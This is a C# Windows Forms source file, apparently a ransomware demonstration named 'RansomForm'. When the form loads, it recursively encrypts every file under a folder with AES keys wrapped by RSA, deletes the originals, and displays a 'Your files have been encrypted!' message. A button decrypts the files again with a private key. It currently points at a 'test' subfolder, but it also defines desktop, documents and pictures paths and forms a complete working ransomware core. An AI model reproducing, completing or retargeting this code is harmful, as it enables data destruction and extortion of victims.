using System.Security.Cryptography;


namespace RansomForm
{
  public partial class Form1 : Form
  {
    //private string publicKey = "<RSAKeyValue><Modulus>zVv2ITIhGtW1h3racpYs87k2qH01zOHC8Lf7ZTZMlETHyJc8mnxWTttPKKcoMXP18+3AEmMD6sHZfj3PjskIOrR2DQ6DBpNuyiZHUCvrgeA8XJmHR2IETtdugeQ6afBUqi6Au7RMMDFh9rcvsszhNxFsLz7lzgHvU6+VwJS04Ok=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

    private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

    private static int encryptedFileCount = 0;
    private static int decryptedFileCount = 0;

    private const string ENCRYPTED_FILE_EXTENSION = ".encrypted";

    private static string ENCRYPTION_LOG = "";
    private static string DECRYPTION_LOG = "";

    private byte[] rsaprivatekey;
    private byte[] rsapublickey;


    public Form1()
    {
      InitializeComponent();
    }


    private void Form1_Load(object sender, EventArgs e)
    {
      beginEncryption();
      formatFormPostEncryption();
    }

    private void beginEncryption()
    {
      using (FileStream fileStream = new("publickey.txt", FileMode.Open))
      {
        rsapublickey = new byte[fileStream.Length];
        fileStream.Read(rsapublickey, 0, rsapublickey.Length);
      }
      // Have pkey in variable.
      string folderpath = Directory.GetCurrentDirectory() + "\\test";
      encryptFolder(folderpath);
      
    }


    private void encryptFolder(string path)
    {
      RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
      int bytesRead;
      RSA.ImportRSAPublicKey(rsapublickey, out bytesRead);
      foreach (string f in Directory.GetFiles(path))
      {
        if (!f.Contains(".encrypted"))
        {
          Console.Out.WriteLine("Encrypting: " + f);
          encryptFile(f, RSA);
        }
      }
      foreach (string f in Directory.GetDirectories(path))
      {
        encryptFolder(f);
      }
    }

    void encryptFile(string path, RSACryptoServiceProvider RSA)
    {
      try
      {
        using (FileStream fileStream = new(path, FileMode.Open))
        {
          using (Aes aes = Aes.Create())
          {
            byte[] keyvalue = new byte[32];
            byte[] iv = new byte[16];

            byte[] encryptedIv = new byte[256];
            byte[] encryptedAesKey = new byte[256];

            aes.Padding = PaddingMode.PKCS7;

            // What we are going to encrypt and write into file.
            iv = aes.IV;
            keyvalue = aes.Key;

            encryptedAesKey = RSA.Encrypt(keyvalue, false); // size 256
            encryptedIv = RSA.Encrypt(iv, false); // size 256

            using (FileStream output = new(path + ".encrypted", FileMode.Create))
            {
              output.Write(encryptedAesKey, 0, encryptedAesKey.Length);
              output.Write(encryptedIv, 0, encryptedIv.Length);

              using (CryptoStream cryptoStream = new(
                output,
                aes.CreateEncryptor(),
                CryptoStreamMode.Write))
              {

                byte[] buffer = new byte[1024];
                var read = fileStream.Read(buffer, 0, buffer.Length);
                while (read > 0)
                {
                  cryptoStream.Write(buffer, 0, read);
                  read = fileStream.Read(buffer, 0, buffer.Length);
                }
                cryptoStream.FlushFinalBlock();

              }
            }
          }
        }
        Console.WriteLine("The file was encrypted.");
        File.Delete(path);
      }
      catch (Exception ex)
      {
        Console.WriteLine($"The encryption failed. {ex}");
      }
      finally
      {
        encryptedFileCount++;
        ENCRYPTION_LOG += encryptedFileCount + ". " + path + Environment.NewLine;//+ "\n" + Environment.NewLine;
      }
    }
    private void formatFormPostEncryption()
    {
      this.Opacity = 100;
      lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
      textBox1.AppendText(ENCRYPTION_LOG);
    }

    private void buttonDecrypt_Click(object sender, EventArgs e) // 5
    {
      string folderpath = Directory.GetCurrentDirectory() + "\\test";
      using (FileStream fileStream = new("privatekey.txt", FileMode.Open))
      {
        rsaprivatekey = new byte[fileStream.Length];
        fileStream.Read(rsaprivatekey, 0, rsaprivatekey.Length);
      }
      decryptFolder(folderpath);
      this.Close();
    }

    void decryptFolder(string path)
    {
      RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
      int bytesRead;
      RSA.ImportPkcs8PrivateKey(rsaprivatekey, out bytesRead);

      foreach (string f in Directory.GetFiles(path))
      {
        if (f.Contains(".encrypted"))
        {
          Console.Out.WriteLine("Decrypting: " + f);
          decryptFile(f, RSA);
        }
      }
      foreach (string f in Directory.GetDirectories(path))
      {
        decryptFolder(f);
      }
    }

    void decryptFile(string path, RSACryptoServiceProvider RSA)
    {
      try
      {
        using (FileStream fileStream = new(path, FileMode.Open))
        {
          using (Aes aes = Aes.Create())
          {
            byte[] decryptedIv = new byte[16];
            byte[] decryptedAesKey = new byte[32];

            byte[] encryptedIv = new byte[256];
            byte[] encryptedAesKey = new byte[256];

            fileStream.Read(encryptedAesKey, 0, 256); // Increases filestream position
            fileStream.Read(encryptedIv, 0, 256);

            decryptedAesKey = RSA.Decrypt(encryptedAesKey, false);
            decryptedIv = RSA.Decrypt(encryptedIv, false);
            
            aes.Key = decryptedAesKey; // length of 256
            aes.IV = decryptedIv;
            aes.Padding = PaddingMode.PKCS7;

            string newpath = path.Replace(".encrypted", "");

            using (FileStream output = new(newpath, FileMode.Create))
            {
              using (CryptoStream cryptoStream = new(
                output,
                aes.CreateDecryptor(),
                CryptoStreamMode.Write))
              {
                byte[] buffer = new byte[1024];
                var read = fileStream.Read(buffer, 0, buffer.Length);
                while (read > 0)
                {
                  cryptoStream.Write(buffer, 0, read);
                  read = fileStream.Read(buffer, 0, buffer.Length);
                }
                cryptoStream.FlushFinalBlock();
              }
            }
          }
        }

        Console.WriteLine("The file was decrypted.");
        File.Delete(path);
      }
      catch (Exception ex)
      {
        Console.WriteLine($"The decryption failed. {ex}");
      }
      finally
      {
        DECRYPTION_LOG += path + Environment.NewLine;
        decryptedFileCount++;
      }
    }
  }
}